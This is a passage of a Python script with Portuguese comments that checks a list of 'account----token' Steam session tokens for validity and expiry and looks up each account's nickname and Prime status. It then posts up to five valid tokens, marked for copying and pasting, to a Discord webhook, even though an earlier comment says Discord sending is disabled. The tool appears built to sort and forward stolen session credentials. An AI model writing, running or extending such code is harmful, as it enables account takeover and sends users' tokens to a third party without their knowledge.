                    result = {
                        'account_id': account_id,
                        'token': token[:50] + "..." if len(token) > 50 else token,
                        'status': 'Expired',
                        'details': f"Token expirou em {exp_time.strftime('%Y-%m-%d %H:%M:%S')}",
                        'expiration_date': exp_time.isoformat(),
                        'timestamp': datetime.now().isoformat()
                    }
                    results.append(result)
                    print(f"  ⏰ Expirado em {exp_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    continue
                
                # Usa o Steam ID do token decodificado (mais confiável)
                steam_id = decoded_token.get('sub', 'Unknown')
                
                result = {
                    'account_id': account_id,
                    'token': token[:50] + "..." if len(token) > 50 else token,
                    'status': 'Valid',
                    'token_valid': True,
                    'steam_id': steam_id,
                    'timestamp': datetime.now().isoformat()
                }
                
                # Obtém informações do jogador
                player_info = get_player_info(steam_id, steam_api_key)
                result.update(player_info)
                
                # Verifica status Prime (com métodos alternativos)
                prime_info = check_prime_status(steam_id, steam_api_key)
                result.update(prime_info)
                
                print_and_save(f"  ✅ Válido - Steam ID: {steam_id}")
                if 'nickname' in result and result['nickname'] != 'Unknown (API Key necessária)':
                    print_and_save(f"      Nickname: {result['nickname']}")
                if 'prime_status' in result and result['prime_status'] not in ['Unknown (API Key necessária)', 'Error: HTTP 404']:
                    prime_text = result['prime_status']
                    if 'csgo_hours' in result:
                        prime_text += f" ({result['csgo_hours']}h CS:GO)"
                    print_and_save(f"      Prime: {prime_text}")
                # Print the token
                print_and_save(f"      Token: {result.get('token', 'Unknown')}")
                
        # Envio para Discord desativado
                
                results.append(result)
                
                # Pequena pausa para não sobrecarregar a API
                time.sleep(0.5)
                
            except Exception as e:
                result = {
                    'account_id': account_id if 'account_id' in locals() else f"token_{i}",
                    'token': line[:50] + "..." if len(line) > 50 else line,
                    'status': 'Error',
                    'details': f'Erro ao processar linha: {str(e)}',
                    'timestamp': datetime.now().isoformat()
                }
                results.append(result)
                print(f"  ✗ Erro: {str(e)}")
    
    except FileNotFoundError:
        print(f"Arquivo {input_file} não encontrado!")
        return
    except Exception as e:
        print(f"Erro ao ler arquivo: {e}")
        return
    
    # Salva os resultados
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\nProcessamento concluído!")
        print(f"Total processado: {len(results)} tokens")
        print(f"Resultados salvos em: {output_file}")
        
        # Estatísticas
        valid_count = sum(1 for r in results if r.get('token_valid', False))
        expired_count = sum(1 for r in results if 'Expired' in r.get('status', ''))
        error_count = sum(1 for r in results if 'Error' in r.get('status', ''))
        
        print(f"\nEstatísticas:")
        print(f"  Válidos: {valid_count}")
        print(f"  Expirados: {expired_count}")
        print(f"  Erros: {error_count}")
        
        # Envia resumo final para Discord
        if valid_count > 0:
            send_final_summary_to_discord(results, valid_count, expired_count, error_count)
        
    except Exception as e:
        print(f"Erro ao salvar resultados: {e}")

def send_final_summary_to_discord(results, valid_count, expired_count, error_count):
    """Envia resumo final para o Discord"""
    try:
        # Coleta todos os tokens válidos
        valid_tokens = []
        for result in results:
            if result.get('token_valid'):
                valid_tokens.append({
                    'account_id': result.get('account_id'),
                    'steam_id': result.get('steam_id'),
                    'nickname': result.get('nickname'),
                    'token': result.get('token')
                })
        
        # Prepara embed de resumo
        embed = {
            "title": "📊 Resumo da Validação de Tokens Steam",
            "color": 0x0099ff,  # Azul
            "fields": [
                {
                    "name": "✅ Tokens Válidos",
                    "value": str(valid_count),
                    "inline": True
                },
                {
                    "name": "⏰ Tokens Expirados", 
                    "value": str(expired_count),
                    "inline": True
                },
                {
                    "name": "❌ Erros",
                    "value": str(error_count),
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Processamento concluído em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            }
        }
        
        # Adiciona lista de tokens válidos completos (limitado a 5 para não sobrecarregar)
        if valid_tokens:
            token_list = ""
            for i, token in enumerate(valid_tokens[:5], 1):
                # Reconstrói o token completo
                complete_token = f"{token['account_id']}----{token['token']}"
                token_list += f"{i}. `{complete_token}`\n"
            
            if len(valid_tokens) > 5:
                token_list += f"... e mais {len(valid_tokens) - 5} tokens válidos"
            
            embed["fields"].append({
                "name": "🎮 Tokens Válidos (Copie e Cole)",
                "value": token_list,
                "inline": False
            })
        
        payload = {
            "embeds": [embed]
        }
        
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        
        if response.status_code == 204:
            print(f"📤 Resumo enviado para Discord")
        else:
            print(f"❌ Erro ao enviar resumo para Discord: {response.status_code}")
            
    except Exception as e:
        print(f"❌ Erro ao enviar resumo para Discord: {str(e)}")

